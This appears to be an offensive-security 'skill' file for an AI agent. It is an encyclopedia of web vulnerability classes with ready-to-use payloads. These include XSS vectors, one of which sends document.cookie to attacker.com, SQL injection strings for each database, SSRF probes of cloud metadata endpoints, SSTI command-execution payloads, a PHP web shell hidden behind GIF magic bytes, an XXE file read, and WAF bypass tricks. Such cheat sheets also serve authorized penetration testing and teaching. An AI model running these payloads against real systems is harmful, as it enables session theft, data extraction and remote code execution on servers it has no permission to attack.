---
name: vuln-classes
description: >
  Vulnerability class encyclopedia. Detection signals, exploitation
  techniques, and impact demonstration for XSS, SQLi, SSRF, IDOR,
  SSTI, path traversal, file upload, XXE, CSRF, CORS, prototype
  pollution, and business logic flaws.
metadata:
  tags: "xss,sqli,ssrf,idor,ssti,lfi,rce,xxe,csrf,cors"
  category: "offensive-security"
---

# Vulnerability Classes — Detection & Exploitation Encyclopedia

## XSS (Cross-Site Scripting)

**Detection**: Input reflected in HTML/JS/attribute context
**Exploitation**: Session hijack, keylogging, CSRF chaining

### Payloads by Context

HTML context:
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=fetch('https://attacker.com/?c='+document.cookie)>
```

Attribute context:
```html
" onmouseover="alert(1)
' autofocus onfocus="alert(1)
javascript:alert(1)
```

JS context:
```javascript
'-alert(document.cookie)-'
</script><script>alert(1)</script>
\';alert(1)//
```

### WAF Bypass
```
Polyglot: jaVasCript:/*-/*`/*`/*'/*"/*/(/* */oNcliCk=alert() )
HTML entities: &#x3C;script&#x3E;
SVG vectors: <svg onload=alert(1)>
Event handlers: onpointerenter, ontoggle, onanimationstart
Template literals: ${alert(1)}
```

---

## SQL Injection

**Detection**: Error messages, boolean/time differences, UNION data
**Exploitation**: Data extraction, auth bypass, RCE

### Payloads by Database

MySQL:
```sql
' OR '1'='1' --
' UNION SELECT 1,2,3 --
' AND SLEEP(5) --
' UNION SELECT table_name FROM information_schema.tables --
```

PostgreSQL:
```sql
' OR 1=1 --
' UNION SELECT 1,2,3 --
' AND pg_sleep(5) --
' UNION SELECT table_name FROM information_schema.tables --
```

MSSQL:
```sql
' OR 1=1 --
' UNION SELECT 1,2,3 --
'; WAITFOR DELAY '0:0:5' --
' UNION SELECT name FROM sys.tables --
```

### WAF Bypass
```
Comment obfuscation: /*!50000SELECT*/
Case: SeLeCt, UnIoN
Unicode: %C0%A0 for space
Parameter pollution: id=1&id=UNION SELECT
JSON: Content-Type: application/json
```

---

## SSRF (Server-Side Request Forgery)

**Detection**: URL parameter fetches external resource
**Exploitation**: Internal network access, cloud metadata

### Payloads
```
http://127.0.0.1
http://[::1]
http://0.0.0.0
http://localhost
http://169.254.169.254/latest/meta-data/    (AWS)
http://metadata.google.internal/             (GCP)
http://100.100.100.200/latest/meta-data/     (Alibaba)
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/
```

### Bypass
```
DNS rebinding
URL encoding: %32%31%37%2e%30%2e%30%2e%31
Decimal IP: http://2130706433/ (= 127.0.0.1)
Octal IP: http://0177.0.0.01/
302 redirect from external server
```

---

## IDOR (Insecure Direct Object Reference)

**Detection**: Different user IDs return different data without auth check
**Exploitation**: Unauthorized data access

### Techniques
```
Sequential ID: /api/users/1 → /api/users/2
GUID/UUID manipulation
Bulk enumeration: /api/users?id[]=1&id[]=2&id[]=3
Replace numeric ID with email/username
GraphQL over-fetching: query { user(id: 2) { email password } }
```

---

## SSTI (Server-Side Template Injection)

**Detection**: Template expression evaluated
**Exploitation**: RCE via template engine

### Detection Payloads
```
{{7*7}}     → 49 = Jinja2/Twig
${7*7}      → 49 = Freemarker/Velocity
<%= 7*7 %>  → 49 = ERB
#{7*7}      → 49 = Pug/Jade
${{7*7}}    → 49 = AngularJS
```

### RCE Payloads
```
Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
```

---

## Path Traversal / LFI

**Detection**: File path parameter, `../` not filtered
**Exploitation**: Arbitrary file read

### Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd%00.jpg
php://filter/convert.base64-encode/resource=index.php
file:///etc/passwd
```

---

## File Upload

**Detection**: Unrestricted file upload
**Exploitation**: Web shell → RCE

### Bypass Techniques
```
Extension: .php → .pHp, .php5, .phtml, .php.jpg, .php%00.jpg
Content-Type: image/jpeg ← but contains PHP
Magic bytes: GIF89a; <?php system($_GET['cmd']); ?>
Polyglot: valid image + PHP code
```

---

## XXE (XML External Entity)

**Detection**: XML body parsed, external entity resolves
**Exploitation**: File read, SSRF, DoS

### Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## CSRF & CORS

**CORS Test**: `Access-Control-Allow-Origin` reflects Origin header
**CSRF**: Create a malicious form that submits on visit

---

## Business Logic

**Amount Tampering**: price=0, quantity=-1, amount=0.01
**Race Conditions**: Parallel requests to exploit TOCTOU
**Workflow Bypass**: Skip steps in multi-step processes
